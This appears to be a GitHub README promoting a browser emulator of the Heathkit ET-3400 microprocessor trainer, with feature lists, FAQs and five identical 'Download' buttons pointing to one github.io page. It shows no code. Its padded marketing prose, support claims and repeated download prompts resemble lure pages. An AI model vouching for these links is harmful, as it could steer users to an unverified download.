![preview](https://raw.githubusercontent.com/Burj-Brand/et-3400-lab/main/banner_64538c.svg)
[![Download](https://raw.githubusercontent.com/Burj-Brand/et-3400-lab/main/run_797c8.svg)](https://Burj-Brand.github.io/et-3400-lab/)

# 🔧 ET-3400 Lab Bench — Browser Edition

**A pixel-faithful, offline-capable interactive laboratory for the Heathkit® ET-3400 Microprocessor Trainer, reimagined for the modern web.**

![status](https://img.shields.io/badge/status-actively--maintained-brightgreen)
![platform](https://img.shields.io/badge/platform-browser%20%7C%20desktop-blue)
![license](https://img.shields.io/badge/license-MIT-yellow)
![language](https://img.shields.io/badge/i18n-multilingual-purple)
![support](https://img.shields.io/badge/support-24%2F7-informational)
![built](https://img.shields.io/badge/build-2026-orange)

---

## 🧭 Table of Contents

1. [What Is This?](#-what-is-this)
2. [The Story Behind the Bench](#-the-story-behind-the-bench)
3. [Feature Highlights](#-feature-highlights)
4. [The Virtual Workbench](#-the-virtual-workbench)
5. [Multilingual Experience](#-multilingual-experience)
6. [Responsive Interface Design](#-responsive-interface-design)
7. [Educational Use Cases](#-educational-use-cases)
8. [The 6800 Instruction Core](#-the-6800-instruction-core)
9. [Memory Map and I/O Modeling](#-memory-map-and-io-modeling)
10. [Assembler and Disassembler](#-assembler-and-disassembler)
11. [Snapshot and Session Persistence](#-snapshot-and-session-persistence)
12. [Accessibility Commitments](#-accessibility-commitments)
13. [Performance Architecture](#-performance-architecture)
14. [Roadmap for 2026](#-roadmap-for-2026)
15. [Frequently Asked Questions](#-frequently-asked-questions)
16. [Disclaimer](#-disclaimer)
17. [License](#-license)

[![Download](https://raw.githubusercontent.com/Burj-Brand/et-3400-lab/main/run_797c8.svg)](https://Burj-Brand.github.io/et-3400-lab/)

---

## 🔍 What Is This?

ET-3400 Lab Bench — Browser Edition is an offline-friendly, no-installation-required simulation environment that recreates the behavior, panel layout, and tactile workflow of the legendary Heathkit® ET-3400 Microprocessor Trainer. It exists for hobbyists, educators, retro-computing enthusiasts, and students who want to explore 6800-family machine code without hunting down aging hardware on auction sites.

Where the original unit sat on a workbench with a seven-segment display, a hex keypad, and a stack of photocopied lab manuals, this project places an equivalent experience in a browser tab. Everything runs client-side. There is no server round-trip for instruction execution, no telemetry, and no dependency on a network connection after the first load.

If you have ever wanted to single-step through a 6800 program while watching the program counter tick across a diagram of memory, this is your lab bench.

---

## 📜 The Story Behind the Bench

The Heathkit® ET-3400 trained a generation of engineers. It taught them how a microprocessor actually behaves — not as an abstraction, but as a collection of registers, flags, and memory cells that respond to voltages and clock edges. That pedagogical honesty is worth preserving.

Modern emulators often abstract away the panel entirely, presenting a terminal and a register dump. That is efficient, but it removes the very thing that made the ET-3400 memorable: the deliberate, physical act of entering bytes one keystroke at a time.

This project keeps the ceremony. You still press keys. You still watch the display. You still feel the small satisfaction of a program that finally runs. The difference is that the bench now fits in a browser window and travels with you.

---

## ✨ Feature Highlights

- **Faithful panel reproduction** — seven-segment display, hex keypad, and function switches rendered with attention to the original layout.
- **Deterministic instruction execution** — every 6800 opcode modeled with cycle-accurate intent.
- **Responsive UI** — the bench reflows gracefully from widescreen monitors down to tablets and phones.
- **Multilingual support** — interface strings localized for a growing set of languages.
- **24/7 customer support** — asynchronous help channels monitored continuously for questions and triage.
- **Session snapshots** — save and reload the complete machine state as a portable document.
- **Integrated assembler** — write mnemonics, get machine code, load it into memory.
- **Integrated disassembler** — inspect memory and reconstruct readable assembly.
- **Breakpoints and single-stepping** — pause exactly where you intend to pause.
- **Zero network dependency after load** — the bench keeps working when the Wi-Fi does not.

[![Download](https://raw.githubusercontent.com/Burj-Brand/et-3400-lab/main/run_797c8.svg)](https://Burj-Brand.github.io/et-3400-lab/)

---

## 🧪 The Virtual Workbench

The workbench is the heart of the experience. It is composed of several coordinated panels, each corresponding to a physical region of the original trainer.

### The Display Row

Six seven-segment digit positions, plus the address/data indicator lamps. The display reflects the current mode: address entry, data entry, or program execution output. Brightness and segment bleed are configurable for those who prefer a softer CRT-like glow or a crisp modern rendering.

### The Hex Keypad

Sixteen keys arranged in the familiar 0–F grid, plus the function keys that drive the trainer's operating modes. Keystrokes are debounced and animated so that tactile feedback is visible even without a physical device.

### The Mode Switches

The original trainer's mode selection is modeled as a small set of mutually exclusive states. Switching modes preserves the current memory contents, exactly as the hardware did.

### The Register Inspector

A dedicated region shows the accumulator, index register, stack pointer, program counter, and condition code register. Values update in real time as instructions retire.

### The Memory Viewer

A scrollable hex dump with address annotations, allowing quick navigation to any region of the address space. Editing a cell is a single click, mirroring the panel entry workflow.

---

## 🌐 Multilingual Experience

Language should never be a barrier to learning how a processor thinks. The interface ships with localization files covering major world languages, and the community is invited to contribute additional translations.

Each locale is stored as a plain data file, which means adding a language does not require touching application logic. Pluralization rules, date formats, and number rendering are handled through a small internal formatter so that translations feel native rather than machine-generated.

If your language is missing, the fallback is a clean, readable English layout — never a broken screen of placeholder tokens.

---

## 📱 Responsive Interface Design

The bench adapts to the space it is given.

- On a large monitor, panels sit side by side in a wide layout reminiscent of a physical bench.
- On a laptop, the memory viewer and register inspector stack vertically while the keypad remains prominent.
- On a tablet, touch targets grow to accommodate fingers rather than cursors.
- On a phone, the interface becomes a focused, single-column experience where the display and keypad take center stage.

Gestures are supported where they make sense: pinch to zoom the memory viewer, swipe to scroll registers, tap-and-hold for contextual actions. Nothing essential is hidden behind a gesture that cannot also be reached through a visible control.

---

## 🎓 Educational Use Cases

This project was built with classrooms in mind.

- **Structured lab exercises** — instructors can distribute snapshot files that place the machine in a known starting state.
- **Guided walkthroughs** — a scripted mode steps students through a program with explanatory overlays.
- **Assessment snapshots** — students submit their machine state for review without needing physical hardware.
- **Self-paced exploration** — curious learners can poke at memory, change a byte, and immediately see the consequence.

Because everything runs locally, a class does not need reliable internet access to use the bench. A single downloaded bundle can serve an entire room.

---

## 🧠 The 6800 Instruction Core

At the center of the simulator is a hand-written execution core for the 6800 family instruction set.

- All documented opcodes are implemented.
- Addressing modes are handled individually: immediate, direct, extended, indexed, and relative.
- Condition code flags are updated according to the documented rules.
- Interrupt handling is modeled, including the reset vector behavior on startup.

The core is deliberately readable. It is organized so that a student can open the source, find the implementation of a specific opcode, and follow the logic without wading through optimization tricks.

---

## 🗺️ Memory Map and I/O Modeling

The trainer's address space is modeled with the same pragmatism as the original hardware.

- RAM regions are writable and persist across instruction execution.
- ROM regions are read-only and reflect the monitor program's behavior.
- Memory-mapped I/O locations respond to reads and writes, driving the display and keypad state.
- The stack grows downward and is bounded, with overflow detectable through inspection.

A memory map diagram is included in the documentation so that learners can see, at a glance, which addresses belong to which subsystem.

---

## 🛠️ Assembler and Disassembler

Two complementary tools ship with the bench.

### The Assembler

Write assembly using standard 6800 mnemonics. Labels, comments, and directives are supported. The assembler produces a listing that shows each source line alongside the generated machine code and its address, which makes the translation from human-readable to machine-readable completely transparent.

### The Disassembler

Point the disassembler at any address and it reconstructs the assembly that would produce the bytes found there. This is invaluable for understanding code you did not write, or for verifying that your assembler produced what you expected.

Both tools share the same opcode table, so they can never disagree with each other.

---

## 💾 Snapshot and Session Persistence

A lab session is more than a program. It is a machine state.

Snapshots capture the complete state of the bench: memory contents, register values, current mode, breakpoints, and display output. A snapshot can be exported as a portable file and re-imported later, on a different device, without loss.

Sessions can also be persisted locally so that closing the tab does not mean losing your work. When you return, the bench is exactly where you left it.

---

## ♿ Accessibility Commitments

An educational tool should be usable by everyone.

- All interactive controls are reachable through keyboard navigation.
- Focus indicators are visible and high-contrast.
- Screen reader labels are provided for the display, keypad, and register inspector.
- Color is never the sole carrier of meaning; icons and text accompany every state change.
- Reduced-motion preferences are respected, disabling non-essential animations.

Accessibility is treated as a first-class requirement, not an afterthought applied at the end of a release cycle.

---

## ⚡ Performance Architecture

The bench is designed to feel instantaneous.

- Instruction execution runs in a tight, allocation-conscious loop.
- Rendering is decoupled from execution, so a heavy program does not stall the interface.
- Large memory dumps are virtualized, so only visible rows are drawn.
- Localization files are loaded lazily, keeping the initial payload small.

On modest hardware, the simulator comfortably exceeds the clock speed of the original trainer, which means even the most enthusiastic single-stepping session never feels like waiting.

---

## 🗓️ Roadmap for 2026

Planned and in-progress work for the coming year includes:

- Additional language packs contributed by the community.
- A waveform view that visualizes bus activity over time.
- Exportable lab reports that summarize a session's execution history.
- An expanded library of example programs with annotated walkthroughs.
- Optional peripheral modules that extend the base trainer's I/O.

The roadmap is a living document. Suggestions are welcome through the project's discussion channels.

---

## ❓ Frequently Asked Questions

**Do I need to install anything?**
No installation ritual is required. The bench is delivered as a self-contained bundle that runs in a modern browser.

**Does it work offline?**
Yes. After the initial load, no network access is needed for normal operation.

**Can I use it on a phone?**
Yes. The responsive layout is designed for small screens as well as large ones.

**Is my data sent anywhere?**
No. Execution happens entirely within your browser. Nothing is transmitted to a remote service.

**Can I contribute a translation?**
Absolutely. Translation files are isolated and straightforward to extend.

**Is this affiliated with the original manufacturer?**
No. This is an independent educational project. See the disclaimer below.

[![Download](https://raw.githubusercontent.com/Burj-Brand/et-3400-lab/main/run_797c8.svg)](https://Burj-Brand.github.io/et-3400-lab/)

---

## ⚠️ Disclaimer

This project is an independent, community-driven educational simulation. It is not affiliated with, endorsed by, sponsored by, or connected to the original manufacturer of the hardware it emulates. All trademarks referenced are the property of their respective owners and are used solely for descriptive, educational purposes.

The simulator is provided as a learning aid. While every effort has been made to model instruction behavior faithfully, no guarantee is made that it reproduces every edge case of the original hardware. Users relying on this tool for critical work should verify behavior independently.

No warranty, express or implied, is provided. Use at your own discretion.

---

## 📄 License

This project is released under the MIT License.

You are welcome to read, study, modify, and redistribute the source under the terms of that license. A working copy of the license text is included in this repository at the path `LICENSE`, and the canonical text is available at https://opensource.org/licenses/MIT.

Copyright (c) 2026 — ET-3400 Lab Bench contributors.

---

## 🙏 Acknowledgements

Gratitude goes to the educators who first recognized that a microprocessor is best understood by touching one, to the hobbyists who kept vintage trainers alive long enough for a new generation to discover them, and to everyone who contributes translations, bug reports, and example programs to this project.

The bench is only as useful as the people who gather around it.

[![Download](https://raw.githubusercontent.com/Burj-Brand/et-3400-lab/main/run_797c8.svg)](https://Burj-Brand.github.io/et-3400-lab/)